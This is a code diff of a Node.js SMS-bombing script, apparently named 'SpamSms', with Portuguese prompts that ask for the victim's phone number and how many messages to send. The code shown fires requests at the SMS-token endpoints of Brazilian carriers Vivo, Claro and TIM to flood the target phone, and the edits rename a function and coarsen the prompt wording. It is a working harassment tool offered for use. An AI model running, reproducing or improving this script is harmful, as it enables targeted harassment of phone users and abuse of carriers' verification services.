@@ -4,9 +4,9 @@ const spam = {}
 const status = {}
 const color = {}
 
-console.log({"ᎷϴᎠϴ ᎠᎬ ႮՏᎪᎡ", "1 COLOQUE O NUMERO DA VITIMA", " 2 INFORME A OPERADORA DA VITIMA", "3 ESCOLHA A QUANTIDADE DE SMS"});
+console.log({name: "SpamSms", version: "1.2", created: "08/08/2020", author: "MisterOfficial"});
 
-const mister = async (uri, postdata, headers = {}, method, proxy = false, jar) => {
+const MisterOfficial = async (uri, postdata, headers = {}, method, proxy = false, jar) => {
 
     let resolve;
     let reject;
@@ -71,7 +71,7 @@ color.white = '\033[1;37m';
 color.reset = '\u001b[0m';
 
 function phone() {
-	return readLine.question(color.cyan+'Coloca o numero: '+color.red);
+	return readLine.question(color.cyan+'Coloca o numero do fudido: '+color.white);
 }
 function quantidade() {
 	return readLine.question(color.cyan+'Quantos SMS quer enviar: '+color.yellow);
@@ -83,7 +83,7 @@ spam.qnt = quantidade();
 
 const sms = async (phone) => {
 	
-	var vivo = await mister('https://recarga-api.vivo.com.br/sms-tokens/', `{"msisdn":"${phone}"}`, {
+	var vivo = await MisterOfficial('https://recarga-api.vivo.com.br/sms-tokens/', `{"msisdn":"${phone}"}`, {
 		'Host': 'recarga-api.vivo.com.br',
 	    'Connection': 'keep-alive',
         'Content-Type': 'application/json',
@@ -94,7 +94,7 @@ const sms = async (phone) => {
             return res.statusCode;
     })
     
-    var claro = await mister('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${phone}","target":"token","origin":"login"}`, {
+    var claro = await MisterOfficial('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${phone}","target":"token","origin":"login"}`, {
 		'Host': 'claro-recarga-api.m4u.com.br',
 	    'Connection': 'keep-alive',
 	    'Channel': 'CLARO_WEB_DESKTOP',
@@ -106,7 +106,7 @@ const sms = async (phone) => {
             return res.statusCode;
     })
     
-    var tim = await mister('https://tim-recarga-api.m4u.com.br/sms-token', `{"msisdn":"${phone}"}`, {
+    var tim = await MisterOfficial('https://tim-recarga-api.m4u.com.br/sms-token', `{"msisdn":"${phone}"}`, {
 		'Host': 'tim-recarga-api.m4u.com.br',
 	    'Connection': 'keep-alive',
         'Content-Type': 'application/json',
